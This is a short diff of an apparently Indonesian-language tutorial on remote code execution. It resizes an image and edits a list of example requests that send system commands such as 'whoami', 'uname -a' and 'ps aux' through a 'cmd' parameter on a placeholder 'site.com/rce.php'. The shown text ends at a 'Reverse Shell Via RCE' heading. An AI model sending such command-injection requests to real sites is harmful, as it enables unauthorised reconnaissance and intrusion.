@@ -1,7 +1,7 @@
 ### Remote Code Execution
 
 <p align="center">
-<img src="https://i.ibb.co/3TNyvvW/20201211-095009.png">
+<img src="https://i.ibb.co/3TNyvvW/20201211-095009.png" height="50" width="50">
 
 Basic For Remote Code Execution ( Critical )
 
@@ -32,7 +32,9 @@ Oke Kita Jalankan Beberapa Perintah Dasar RCE
 http://site.com/rce.php?cmd=ls
 http://site.com/rce.php?cmd=whoami
 http://site.com/rce.php?cmd=uname -a
-http://site.com/rce.php?cmd=id
+http://site.com/rce.php?cmd=pwd
+http://site.com/rce.php?cmd=ps aux
+
 ```
 
 ### Reverse Shell Via RCE
